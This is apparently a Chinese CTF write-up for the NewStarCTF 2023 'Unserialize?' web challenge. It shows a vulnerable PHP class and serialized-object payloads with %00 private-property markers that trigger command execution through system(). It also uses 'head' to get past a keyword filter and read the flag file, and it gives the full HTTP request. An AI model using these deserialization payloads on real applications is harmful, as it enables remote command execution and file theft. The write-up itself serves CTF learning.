---
title: NewStarCTF 2023 Unserialize？
date: 2023-10-24
categories:
  - CTF
  - Web
---

## 前置工作

进入靶机网页，看到如下代码，进行代码审计

```php
<?php
highlight_file(__FILE__);
// Maybe you need learn some knowledge about deserialize?
class evil {
    private $cmd;

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

@unserialize($_POST['unser']);
?>
```

思路很明确，我们需要利用 PHP 的反序列化漏洞，所以我们需要自己重现这个对象

## 编写对象生成脚本

打开 IDE（我用的是 PhpStorm），输入如下代码，这个代码的作用是帮我们生成一个 `$cmd` 具有有效值的 `evil` 对象，将其序列化（即 `serialize()`）后就会输出对象字符串

```php
<?php
class evil {
    private $cmd="ls ../../../"; // 这个 ls ../../../ 是试出来的

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

$ev = new evil();
echo serialize($ev);
```

运行过后，得到字符串 `O:4:"evil":1:{s:9:" evil cmd";s:12:"ls ../../../";}`

但是这里有一个重要的点，` evil cmd` 中间有两个空格，如果你使用了 PhpStorm，会看到两个方框乱码，实际上，这个位置我们需要填上 `%00`，表示 `$cmd` 是 `evil` 类的 `private` 属性，所以最后我们的字符串应该是 `O:4:"evil":1:{s:9:"%00evil%00cmd";s:12:"ls ../../../";}`

我们向靶机通过 POST `unser` 传入这个字符串

![](https://z1.ax1x.com/2023/10/13/pipp4xI.png)

发现了关键信息 `th1s_1s_fffflllll4444aaaggggg`

## 再次编写生成脚本

这个 `th1s_1s_fffflllll4444aaaggggg` 应该就是文件了，但是题目里面对 `cat|tac|more|tail|base` 都进行了过滤，如果你去百度一下或者问问 ChatGPT，他肯定会告诉你，Linux 里面还能用 `head` 来读取文件，即

```
head ../../../th1s_1s_fffflllll4444aaaggggg
```

于是我们重新编写脚本

```php
<?php
class evil {
    private $cmd="head ../../../th1s_1s_fffflllll4444aaaggggg";

    public function __destruct()
    {
        if(!preg_match("/cat|tac|more|tail|base/i", $this->cmd)){
            @system($this->cmd);
        }
    }
}

$ev = new evil();
echo serialize($ev);
```

生成出来的字符串为 `O:4:"evil":1:{s:9:"%00evil%00cmd";s:43:"head ../../../th1s_1s_fffflllll4444aaaggggg";}`

## 取得 Flag

再次通过 `unser` 传入，即可得到 Flag

最终的 Http 请求如下

```http
POST / HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

unser=O:4:"evil":1:{s:9:"%00evil%00cmd";s:43:"head ../../../th1s_1s_fffflllll4444aaaggggg";}
```

![](https://z1.ax1x.com/2023/10/13/pippOiQ.png)

最终得到的 Flag 为 `flag{2dafcaae-edd2-4604-a4ba-ce47d7fb5c59}`